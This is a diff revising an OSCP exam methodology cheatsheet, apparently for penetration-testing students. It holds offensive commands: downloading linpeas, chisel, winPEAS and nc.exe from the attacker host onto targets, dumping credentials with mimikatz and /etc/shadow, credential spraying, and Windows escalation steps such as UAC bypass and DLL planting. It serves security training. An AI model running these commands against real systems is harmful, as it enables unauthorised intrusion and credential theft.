@@ -9,16 +9,15 @@ summary: "A master checklist that follows the exam-day workflow from start to fi
 A master checklist that follows the exam-day workflow from start to finish.
 
 - Source: https://heretek.dev/oscp-cheatsheet/methodology/ (Jean Romero) — reconstructed
-- Variables: `$TARGET` = target host, `$KALI` = attacker (Kali) IP
+- Variables: `$TARGET` = target host, `$KALI` = attacker (Kali) IP (`$ip` is used as a target-host alias in many commands)
 
-## Mentor tip — always escape `!` in passwords
+## Mentor tip — quote passwords with `!`
 
 ```bash
-# Passwords containing " ! " must be escaped as \!
-# Even wrapped in ' ', the ! is not read correctly when the command runs.
+# In bash, wrap the password in single quotes.
+# "Password1\!" passes a literal backslash to the command; in an interactive shell, history expansion can still bite.
 
-nxc smb 10.10.10.10 -u offsec -p "Password1\!"
-# 'Password1!' does not work correctly.
+nxc smb 10.10.10.10 -u offsec -p 'Password1!'
 ```
 
 ## Emergency quick-reference when stuck
@@ -52,8 +51,8 @@ echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
 Passing combinations (70 points to pass):
 
 - AD full (40) + standalone full (20) + standalone initial (10) = 70 pass
-- AD partial (30) + standalone full (40) x 2 = 70 pass
-- AD full (40) + standalone full (40) x 2 = 80, with margin
+- AD partial (30) + standalone full (20) x 2 = 70 pass
+- AD full (40) + standalone full (20) x 2 = 80, with margin
 
 AD has partial credit: workstation flag 10 points, DC 20 points.
 
@@ -66,8 +65,9 @@ Time budget:
 - 11–12 hours: while access is still alive, take screenshots + start report notes.
 - 12–16 hours: keep exploiting. Rotate between stuck boxes.
 - After 16 hours: wrap up. Confirm all screenshots are captured. Verify all proof flags.
+- The exam allows 23h45. If you are short on points, keep rotating boxes until ~22 hours, then finalize the report.
 
-Strategy: do the AD set first (40 points, most efficient). No more than 2 hours on one box. Immediately spray every credential you find across everything.
+Strategy: do the AD set first (40 points, most efficient). If a box gives no foothold after 30 minutes, change approach; if still stuck after 2 hours, switch boxes. Immediately spray every credential you find across everything.
 
 Report note: proof-flag screenshots use `whoami; hostname; ip a; cat proof.txt` (Linux) or `whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt` (Windows — semicolons instead of `&&`). Record every step — the report decides pass/fail. Take screenshots during the work, not later.
 
@@ -245,18 +245,18 @@ The HTTP file server should already be running from Phase 0. If not: `cd ~/Tools
 
 ```bash
 # Upload to Linux target
-wget http://KALI/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
-wget http://KALI/chisel -O /tmp/chisel && chmod +x /tmp/chisel
-wget http://KALI/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
+wget http://$KALI/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
+wget http://$KALI/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+wget http://$KALI/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
 ```
 
 ```powershell
 # Upload to Windows target
-certutil -urlcache -f http://KALI/winpeas.exe C:\Windows\Temp\winpeas.exe
-certutil -urlcache -f http://KALI/chisel.exe C:\Windows\Temp\chisel.exe
-certutil -urlcache -f http://KALI/nc.exe C:\Windows\Temp\nc.exe
+certutil -urlcache -f http://$KALI/winpeas.exe C:\Windows\Temp\winpeas.exe
+certutil -urlcache -f http://$KALI/chisel.exe C:\Windows\Temp\chisel.exe
+certutil -urlcache -f http://$KALI/nc.exe C:\Windows\Temp\nc.exe
 # Fallback if certutil is blocked:
-powershell -c "iwr http://KALI/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe"
+powershell -c "iwr http://$KALI/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe"
 # If using evil-winrm (built-in upload):
 upload /home/kali/Tools/winpeas.exe C:\Windows\Temp\winpeas.exe
 ```
@@ -445,7 +445,7 @@ Spraying every discovered credential against every service immediately is the ha
 # Windows:  mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
 # Linux:    cat /etc/shadow
 
-# Run the 8-item checklist. Catches creds that mimikatz/secretsdump miss:
+# 3. Run the 8-item checklist. Catches creds that mimikatz/secretsdump miss:
 # hash-bearing log files, plaintext cred text files, SSH keys, backup files, web configs
 
 # 4. Re-check the internal network (root may see new interfaces)
@@ -476,16 +476,16 @@ Check in order. The first 3 catch about 80% of vectors.
 
 Identify the shell type: `C:\>` = CMD, `PS C:\>` = PowerShell. Commands below work in both unless noted. Switch with: `cmd` or `powershell -ep bypass`.
 
-2. WinPEAS: `.\winpeas.exe cmd | Tee-Object -FilePath .\winpeas.txt` (PS) or `.\winpeas.exe cmd > winpeas.txt` (CMD) → check RED/YELLOW
-3. Service misconfiguration: `wmic service get name,pathname,startmode` → unquoted path or writable binary → `sc config`
-4. Saved creds: `cmdkey /list` → entry found → `runas /savecred`
-5. PS history — CMD: `type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` / PS: `Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue` → credential reuse
-6. AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` → msfvenom MSI
-7. SAM/SYSTEM backup — CMD: `dir C:\Windows\Repair\SAM` / PS: `Get-ChildItem C:\Windows\Repair\SAM -EA SilentlyContinue` → secretsdump
-8. Scheduled tasks: `schtasks /query /fo LIST /v` → writable script?
-10. DLL hijacking — CMD: `echo %PATH%` / PS: `$env:PATH -split ';'` → writable directory on PATH → plant a DLL
-11. Internal services: `netstat -ano | findstr LISTENING` → interact directly first (MySQL `-e`, curl) → if needed, Chisel tunnel → PHASE 4 Step 4B
-12. UAC bypass: `whoami /groups` → Medium Mandatory + admin → fodhelper
+1. WinPEAS: `.\winpeas.exe cmd | Tee-Object -FilePath .\winpeas.txt` (PS) or `.\winpeas.exe cmd > winpeas.txt` (CMD) → check RED/YELLOW
+2. Service misconfiguration: `wmic service get name,pathname,startmode` → unquoted path or writable binary → `sc config`
+3. Saved creds: `cmdkey /list` → entry found → `runas /savecred`
+4. PS history — CMD: `type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` / PS: `Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue` → credential reuse
+5. AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` → msfvenom MSI
+6. SAM/SYSTEM backup — CMD: `dir C:\Windows\Repair\SAM` / PS: `Get-ChildItem C:\Windows\Repair\SAM -EA SilentlyContinue` → secretsdump
+7. Scheduled tasks: `schtasks /query /fo LIST /v` → writable script?
+8. DLL hijacking — CMD: `echo %PATH%` / PS: `$env:PATH -split ';'` → writable directory on PATH → plant a DLL
+9. Internal services: `netstat -ano | findstr LISTENING` → interact directly first (MySQL `-e`, curl) → if needed, Chisel tunnel → PHASE 4 Step 4B
+10. UAC bypass: `whoami /groups` → Medium Mandatory + admin → fodhelper
 
 Additional commands:
 
@@ -558,7 +558,7 @@ Don't read PEAS output top to bottom for 30 minutes. Grep the sections above, ch
 3. BloodHound check: ACL edges? ADCS? Delegation? (Phase 3-4)
 4. Every machine where you get admin → secretsdump → spray new hashes (Phase 5-6)
 5. Repeat 2-4 for every new cred
-6. DA → DCSync → PtH to DC → proof.txt (Phase 9)
+6. DA → DCSync → PtH to DC → proof.txt (Phase 7)
 ```
 
 ### AD reminders
